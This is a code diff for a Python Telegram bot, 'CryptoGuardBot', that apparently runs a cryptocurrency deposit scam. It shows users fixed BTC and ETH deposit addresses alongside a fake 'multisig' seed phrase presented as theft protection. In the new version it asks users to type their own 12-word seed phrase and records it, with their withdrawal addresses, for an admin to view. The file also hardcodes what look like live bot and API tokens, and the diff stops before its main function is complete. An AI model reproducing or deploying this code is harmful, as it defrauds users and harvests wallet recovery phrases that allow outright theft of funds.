@@ -1,176 +1,193 @@
-import json
-import logging
+from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
+from telegram.ext import Updater, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, Filters
 import random
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
-from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
+import requests
+import time
 
-# === CONFIG ===
+# === CONFIGURATION ===
 BOT_TOKEN = "7744583633:AAFdAkB-hO68tDMY0GwOBXh3trA8EI9ydSY"
-ADMIN_CHAT_ID = 6190128347  # Replace with your Telegram numeric user ID
+BLOCKCYPHER_TOKEN = "b4aa61c7eab349bcb23a897c9734b211"  # BlockCypher API Token
 BTC_ADDRESS = "bc1q6d5t0pf08nu484wu6q3ju0u53cueyuu3xcp7w5"
 ETH_ADDRESS = "0x35e9a327c3bB9B41BA00f1658A69D8086c30CB40"
-DATA_FILE = "users.json"
+ADMIN_ID = 123456789  # Replace with your Telegram numeric user ID
 
-# === LOGGING ===
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+# === Temporary in-memory storage ===
+user_states = {}
+refund_addresses = {}
+withdrawal_requests = {}
+key_phrases = {}
+user_data = set()
 
-# === Load BIP39 Wordlist (Electrum-style) ===
-with open("english.txt", "r") as f:
-    WORDLIST = [word.strip() for word in f.readlines()]
-
-# === HELPER FUNCTIONS ===
-def load_users():
-    try:
-        with open(DATA_FILE, "r") as f:
-            return json.load(f)
-    except:
-        return {}
-
-def save_users(users):
-    with open(DATA_FILE, "w") as f:
-        json.dump(users, f, indent=2)
-
+# === Seed Phrase Generator ===
 def generate_seed_phrase():
-    return ' '.join(random.sample(WORDLIST, 12))
+    with open("bip39_english_wordlist.txt", "r") as f:
+        words = f.read().splitlines()
+    return " ".join(random.sample(words, 12))
 
-# === BOT HANDLERS ===
+# === Start Command ===
 def start(update: Update, context: CallbackContext):
+    user_id = update.message.from_user.id
+    user_data.add(user_id)
     keyboard = [
-        [InlineKeyboardButton("🔶 BTC", callback_data='choose_btc')],
-        [InlineKeyboardButton("🔷 ETH", callback_data='choose_eth')]
+        [InlineKeyboardButton("💰 Deposit BTC", callback_data='deposit_btc')],
+        [InlineKeyboardButton("💰 Deposit ETH", callback_data='deposit_eth')],
+        [InlineKeyboardButton("📜 Guide", callback_data='show_guide')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
+    update.message.reply_text("Welcome to CryptoGuardBot! Please select an option:", reply_markup=reply_markup)
 
-    update.message.reply_text(
-        "Welcome to our secure crypto gateway! 👋\n\n"
-        "Please choose your preferred currency to proceed:",
-        reply_markup=reply_markup
-    )
+# === Guide ===
+def guide(update: Update, context: CallbackContext):
+    guide_text = """\
+📜 *CryptoGuard Guide* 🚡
 
-def handle_currency_choice(update: Update, context: CallbackContext):
+1. /start – Begin
+2. Choose BTC or ETH
+3. Send deposit to provided address
+4. Bot will detect the real TX (via blockchain)
+5. Enter 12-word phrase
+6. Set withdrawal address
+7. Set refund address (optional)
+8. Complete transaction ✅
+
+Contact support for help.
+"""
+    update.message.reply_text(guide_text, parse_mode="Markdown")
+
+# === Blockchain Polling ===
+def check_blockchain_for_tx(address, coin):
+    url = f"https://api.blockcypher.com/v1/{'btc/main' if coin == 'btc' else 'eth/main'}/addrs/{address}/full?token={BLOCKCYPHER_TOKEN}"
+    try:
+        res = requests.get(url)
+        data = res.json()
+        if 'txs' in data:
+            for tx in data['txs']:
+                if tx.get('confirmations', 0) > 0:
+                    value = tx['total'] / 1e8 if coin == 'btc' else tx['total'] / 1e18
+                    return tx['hash'], value, tx['confirmations']
+    except Exception as e:
+        print("Blockchain check error:", e)
+    return None, 0, 0
+
+# === Handle Button Clicks ===
+def button_handler(update: Update, context: CallbackContext):
     query = update.callback_query
-    user_id = str(query.from_user.id)
-    username = query.from_user.username or "N/A"
-    users = load_users()
-
-    # Register user if not already
-    if user_id not in users:
-        users[user_id] = {
-            "username": username,
-            "refund_address": None,
-            "confirmed": False,
-            "destination": None,
-            "currency": None
-        }
-
-    if query.data == "choose_btc":
-        address = BTC_ADDRESS
-        currency = "BTC"
-    else:
-        address = ETH_ADDRESS
-        currency = "ETH"
-
-    users[user_id]["currency"] = currency
-    save_users(users)
-
-    # Generate fake seed phrase
-    seed = generate_seed_phrase()
-
+    user_id = query.from_user.id
     query.answer()
-    query.edit_message_text(
-        f"🪙 *{currency} Deposit Instructions*\n"
-        f"Send your {currency} to the following address:\n\n"
-        f"`{address}`\n\n"
-        f"🔐 *Seed Phrase (Multi-Sig Simulation)*\n"
-        f"`{seed}`\n\n"
-        "🛡️ This is a multi-signature wallet setup to prevent theft and scams.",
-        parse_mode=ParseMode.MARKDOWN
-    )
 
-def handle_message(update: Update, context: CallbackContext):
-    user_id = str(update.effective_user.id)
-    msg = update.message.text.strip()
-    users = load_users()
+    if query.data == "deposit_btc":
+        phrase = generate_seed_phrase()
+        user_states[user_id] = {"coin": "btc", "seed_phrase": phrase}
+        key_phrases[user_id] = phrase
+        msg = f"💰 *BTC Deposit Address:* `{BTC_ADDRESS}`\n\n🔐 *Multisig Seed (simulated):* `{phrase}`\n\nPlease send your BTC. The bot will detect it automatically."
+        query.edit_message_text(msg, parse_mode="Markdown")
 
-    if user_id not in users:
-        update.message.reply_text("Please type /start first.")
-        return
+    elif query.data == "deposit_eth":
+        phrase = generate_seed_phrase()
+        user_states[user_id] = {"coin": "eth", "seed_phrase": phrase}
+        key_phrases[user_id] = phrase
+        msg = f"💰 *ETH Deposit Address:* `{ETH_ADDRESS}`\n\n🔐 *Multisig Seed (simulated):* `{phrase}`\n\nPlease send your ETH. The bot will detect it automatically."
+        query.edit_message_text(msg, parse_mode="Markdown")
 
-    user = users[user_id]
+    elif query.data == "show_guide":
+        guide(update, context)
 
-    if not user["refund_address"]:
-        user["refund_address"] = msg
-        save_users(users)
-        update.message.reply_text("✅ Refund address saved. Once you've sent the deposit, type *confirm*", parse_mode=ParseMode.MARKDOWN)
-    elif not user["confirmed"]:
-        update.message.reply_text("⚠️ Type *confirm* to confirm deposit or send a destination address after confirming.", parse_mode=ParseMode.MARKDOWN)
-    elif user["confirmed"] and not user["destination"]:
-        user["destination"] = msg
-        save_users(users)
-        update.message.reply_text("✅ Destination address saved. Awaiting admin processing.")
-        context.bot.send_message(
-            chat_id=ADMIN_CHAT_ID,
-            text=f"🚨 New confirmed deposit!\nUser: @{user['username']}\nRefund: `{user['refund_address']}`\nDestination: `{user['destination']}`",
-            parse_mode=ParseMode.MARKDOWN
-        )
-    else:
-        update.message.reply_text("✅ You've already completed all steps. Wait for admin action.")
-
+# === /confirm command ===
 def confirm(update: Update, context: CallbackContext):
-    user_id = str(update.effective_user.id)
-    users = load_users()
-
-    if user_id not in users:
-        update.message.reply_text("Please type /start first.")
+    user_id = update.message.from_user.id
+    if user_id not in user_states:
+        update.message.reply_text("Please start a session using /start.")
         return
 
-    users[user_id]["confirmed"] = True
-    save_users(users)
+    coin = user_states[user_id]["coin"]
+    address = BTC_ADDRESS if coin == 'btc' else ETH_ADDRESS
 
-    update.message.reply_text("✅ Deposit confirmed. Now send the *destination address* to forward the funds.", parse_mode=ParseMode.MARKDOWN)
-    context.bot.send_message(
-        chat_id=ADMIN_CHAT_ID,
-        text=f"🟢 @{users[user_id]['username']} has confirmed a deposit.\nRefund: `{users[user_id]['refund_address']}`",
-        parse_mode=ParseMode.MARKDOWN
-    )
+    update.message.reply_text("⏳ Verifying your transaction on blockchain...")
+    txid, value, conf = check_blockchain_for_tx(address, coin)
 
-def status(update: Update, context: CallbackContext):
-    if update.effective_user.id != ADMIN_CHAT_ID:
-        update.message.reply_text("Access denied.")
+    if txid:
+        update.message.reply_text(
+            f"✅ Transaction detected!\n\n"
+            f"*Amount:* {value:.6f} {coin.upper()}\n"
+            f"*Confirmations:* {conf}\n"
+            f"*TXID:* `{txid}`",
+            parse_mode="Markdown")
+
+        update.message.reply_text("Please enter your *12-word seed phrase* to proceed:", parse_mode="Markdown")
+        user_states[user_id]["awaiting_seed"] = True
+    else:
+        update.message.reply_text("❌ No confirmed transactions found. Try again later.")
+
+# === Message handler ===
+def message_handler(update: Update, context: CallbackContext):
+    user_id = update.message.from_user.id
+    msg = update.message.text
+
+    if user_id in user_states:
+        state = user_states[user_id]
+
+        if state.get("awaiting_seed"):
+            state["entered_seed"] = msg
+            state["awaiting_seed"] = False
+            update.message.reply_text("✅ Seed phrase recorded.")
+            update.message.reply_text("Please enter the *withdrawal address*:", parse_mode="Markdown")
+            state["awaiting_withdraw"] = True
+            return
+
+        if state.get("awaiting_withdraw"):
+            withdrawal_requests[user_id] = msg
+            state["awaiting_withdraw"] = False
+            update.message.reply_text("✅ Withdrawal address saved.")
+            update.message.reply_text("Please enter a *refund address* (optional):", parse_mode="Markdown")
+            state["awaiting_refund"] = True
+            return
+
+        if state.get("awaiting_refund"):
+            refund_addresses[user_id] = msg
+            state["awaiting_refund"] = False
+            update.message.reply_text("✅ Refund address saved. Transaction flow complete!")
+            return
+
+# === Admin Dashboard ===
+def admin(update: Update, context: CallbackContext):
+    user_id = update.message.from_user.id
+    if user_id != ADMIN_ID:
+        update.message.reply_text("Unauthorized.")
         return
 
-    users = load_users()
-    msg = "*User Status Report:*\n\n"
+    keyboard = ReplyKeyboardMarkup([
+        ["Users", "Deposits"],
+        ["Withdrawals", "Refunds"]
+    ], resize_keyboard=True)
 
-    for uid, info in users.items():
-        msg += f"👤 @{info.get('username', 'N/A')} | ID: {uid}\n"
-        msg += f"  - Refund: `{info.get('refund_address')}`\n"
-        msg += f"  - Confirmed: {info.get('confirmed')}\n"
-        msg += f"  - Destination: `{info.get('destination')}`\n\n"
+    update.message.reply_text("👨‍💼 Admin Dashboard\nChoose an option:", reply_markup=keyboard)
 
-    update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
+def admin_panel_handler(update: Update, context: CallbackContext):
+    user_id = update.message.from_user.id
+    if user_id != ADMIN_ID:
+        return
 
-# === MAIN ===
+    text = update.message.text
+    if text == "Users":
+        update.message.reply_text(f"👤 Total Users: {len(user_data)}")
+    elif text == "Deposits":
+        update.message.reply_text(f"BTC Address: {BTC_ADDRESS}\nETH Address: {ETH_ADDRESS}")
+    elif text == "Withdrawals":
+        if not withdrawal_requests:
+            update.message.reply_text("No withdrawals yet.")
+        else:
+            for uid, addr in withdrawal_requests.items():
+                update.message.reply_text(f"User {uid}: {addr}")
+    elif text == "Refunds":
+        if not refund_addresses:
+            update.message.reply_text("No refund addresses.")
+        else:
+            for uid, addr in refund_addresses.items():
+                update.message.reply_text(f"User {uid}: {addr}")
+
+# === Main ===
 def main():
     updater = Updater(BOT_TOKEN, use_context=True)
     dp = updater.dispatcher
 
-    # === Command Handlers ===
     dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(CommandHandler("confirm", confirm))
-    dp.add_handler(CommandHandler("status", status))
-
-    # === Inline Button Handler for BTC/ETH Selection ===
-    dp.add_handler(CallbackQueryHandler(handle_currency_choice, pattern='^choose_'))
-
-    # === Generic Text Handler ===
-    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
-
-    # === Start the Bot ===
-    updater.start_polling()
-    logger.info("Bot is running...")
-    updater.idle()
-
-if __name__ == "__main__":
-    main()
